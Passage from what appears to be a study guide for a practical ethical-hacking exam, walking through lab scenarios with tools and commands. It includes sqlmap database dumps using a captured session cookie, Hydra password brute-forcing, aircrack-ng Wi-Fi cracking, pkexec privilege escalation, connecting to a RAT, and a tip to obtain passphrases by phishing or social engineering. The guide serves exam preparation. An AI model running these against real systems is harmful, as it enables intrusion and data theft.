- https://emn178.github.io/online-tools/sha384_file_hash.html
- **Things to google:** Hacking Android Devices with Phonesploit over ADB, Analyze ELF Executable File using Detect It Easy (DIE), Calculating Hashes on Windows with different tools

## Example Scenario #5
Perform the vulnerability scan for the given IP address. What is the severe value of a vulnerability that indicates the end of life for a web development language platform?
- **Tips:** Use Nessus to scan the target. Nessus will provide all results.
- **Things to google:** -

## Example Scenario #6
Exploit a remote login application on a Linux target in the given subnet to access a sensitive file. Enter the content of the file.
- **Tips:** Use Hydra to break the password Telnet, login and access the file, and enter the flag
- **Things to google:** FTP Exploitation. telnet exploitation

## Example Scenario #7
Analyze the image file to extract the hidden message. Password is given.
- **Tips:** Use Open stego to reveal the secret
- **Things to google:** Image Steganography

## Example Scenario #8
Exploit weak credentials of FTP. Obtain the hidden file.
- **Tips:** Use Hydra to break the password, login and access the file, and enter the flag
- **Things to google:** FTP Exploitation.

## Example Scenario #9
Escalate privilege on a Linux machine. User-level credentials are given.
```
Try >sudo su
Try >sudo -l
```
- **Tips:** Use polkit exploit to get the root access
- **Things to google:** Walkthrough - Escalate Privileges by Exploiting Vulnerability in pkexec

## Example Scenario #10
Find a file entry point. File is given.
- **Tips:** Use DIE(detect it easy) or exeinfo PE tools.
- **Things to google:** Analyze ELF Executable File using Detect It Easy (DIE), Find the Portable Executable (PE) Information of a Malware Executable File

## Example Scenario #11
From a pcap file, analyze a DDOS attack and provide the IP address that sent most packets.
- **Tips:** Use Wireshark and statistics tab
- **Things to google:** Detect DDOS attack with Wireshark

## Example Scenario #12
You are provided a username/password for a website. Use SQL Injection attack to extract the password of another user.
- **Tips:** Log in with the given credential. Go to profile page note the full url. In developer tools go to Console and type document.cookie Use cookie to extract the password of a user from the table with sqlmap.
  - `$ sqlmap -u "URL of profile page" --cookie="captured cookie of logged in user" --dbs`    #for Database
  - `$ sqlmap -u "URL" --cookie="captured cookie of logged in user" -D *DATABASE NAME* --tables` #for Tables of selected Database
  - `$ sqlmap -u "URL" --cookie="captured cookie of logged in user" -D *DATABASE NAME* -T *TABLE NAME* --columns` #for Column names
  - `$ sqlmap -u "URL" --cookie="captured cookie of logged in user" -D *DATABASE NAME* -T *TABLE NAME* --dump` #dump the table
- **Things to google:** SQL Injection Vulnerabilities, SQL Injection Challenge (SQLMAP THM Free Room)

## Example Scenario #13
Exploit a web application at www.xxxx.com and enter the flag value from a given page.
Find a login page, or owasp zap 
Check for robots.txt
Fuzz the server for pages
>ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.143.169/FUZZ -mc all -c -fc 404 -e .php,.html,.txt
>gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .html,.php -u http://10.10.10.10
- **Tips:** Find any input parameter on website and capture the request in burp and then use it to perform sql injection using sqlmap
  - `sqlmap -r <txt file from burpsuite> -D <database name> --tables`
  - `sqlmap -r <txt file from burpsuite> -D <database name> --tables --columns`
  - `sqlmap -r <txt file from burpsuite> -D <database name> --dump`
  - `sqlmap -r <txt file from burpsuite> -D <database name> --tables -T users`
- **Things to google:** SQL Injection Vulnerabilities, SQL Injection Challenge (SQLMAP THM Free Room)

## Example Scenario #14
Perform vulnerability research and exploit the target at a given site. Looks for file upload functionality.
- **Tips:** Scan the target with Zapp to find the vulnerability. Then exploit it. It can be file upload/File inclusion vulnerability on DVWA.
- **Things to google:** DVWA file upload, File Inclusion

## Example Scenario #15
Perform SQL injection on a website and extract flag value.
- **Tips:** Use sqlmap
- **Things to google:** SQL Injection Vulnerabilities, SQL Injection Challenge (SQLMAP THM Free Room)

## Example Scenario #16
A file is available in a directory with DVWA. Access the file and enter the contents.
- **Tips:** Use the file inclusion mechanism to access the file
- **Things to google:** DVWA File Inclusion

## Example Scenario #17
Analyze IoT traffic from a pcap file. Identify the packet with the publish message and enter the length.
- **Tips:** Open IoT capture file in Wireshark. Filter; MQTT and find length of the packet in the lower pane
- **Things to google:** Detect IoT traffic

## Example Scenario #18
Crack the weak credentials of wifi from a pcap file.
- **Tips:** Use aircrack-ng to crack the password.
  - `$ aircrack-ng '*/target file.cap*' -w */wordlist*`
- **Things to google:** Walkthrough - Perform Wireless Attacks, Crack Wifi with Aircrack

## Example Scenario #19
A RAT server is installed on a server. Connect with it and access the file.
- **Tips:** Scan all ports with nmap (-p-). Look for the unknown ports. Use theef RAT to connect to it.
- **Things to google:** Create a Trojan Server using Theef RAT Trojan

## Example Scenario #20
Decrypt the Veracrypt volume.
- **Tips:** Use Veracrypt to decrypt the volume.
  - Use Veracrypt to log in the hidden drive
  - Password is hidden in another machine
  - Open file
  - Decrypt the hash and enter the contents
- **Things to google:** Disk Encryption Using Veracrypt, Calculating Hashes on Windows with different tools

## Final Tips

- **Scenario 1:** For scanning a subnet efficiently, consider using `nmap` with the `-sn` flag to ping sweep the subnet first, identifying active hosts before running more intensive scans. Example: `nmap -sn 192.168.1.0/24`.
  
- **Scenario 3:** When cracking SMB credentials, combining `Hydra` with a custom wordlist tailored to the organization's password policies can increase your chances of success. Remember, ethical hacking only!
  
- **Scenario 4:** For analyzing Android devices, `adb devices` can give you a quick list of connected devices. From there, `adb pull /path/to/folder` will download the files you're interested in.
  
- **Scenario 7:** In image steganography, tools like `steghide` can also be useful. For a quick check without a passphrase, `steghide info file.jpg` can show if a passphrase is needed.
  
- **Scenario 9:** For privilege escalation, always check for `sudo` misconfigurations with `sudo -l`. You might find you can run commands as another user without a password. `sudo -u alice cat /path/to/file`
  
- **Scenario 12:** With SQL injection, using a proxy like Burp Suite to intercept and modify requests can provide valuable insights into how the application handles SQL queries, aiding in crafting effective payloads.
  
- **Scenario 14:** When researching vulnerabilities, sites like CVE Details can provide up-to-date information on known vulnerabilities. Always cross-reference findings with multiple sources.
  
- **Scenario 18:** For Wi-Fi cracking, remember that `aircrack-ng` is most effective with a strong signal and enough data packets. Use `airodump-ng` to monitor the target network and gather packets before attempting to crack.
  
- **Scenario 20:** When dealing with encrypted volumes, remember that brute-forcing a strong passphrase is impractical. Focus on finding the passphrase through other means, such as phishing, social engineering, or exploiting other system vulnerabilities.

